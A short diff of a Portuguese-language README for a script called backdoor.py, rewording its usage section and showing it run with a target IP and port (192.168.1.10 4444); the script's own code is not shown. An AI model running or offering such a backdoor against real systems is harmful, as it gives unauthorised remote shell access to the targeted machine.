@@ -22,8 +22,8 @@ Permite navegação entre diretórios
 
 Certifique-se de ter o Python instalado.
 
-Execute o script da seguinte forma:
-python3 backdoor.py <ip_alvo> <porta>
+Exemplo de Uso:
 
-Exemplo:
-python backdoor.py 192.168.1.10 4444
+python3 backdoor.py ip_alvo porta
+
+python3 backdoor.py 192.168.1.10 4444
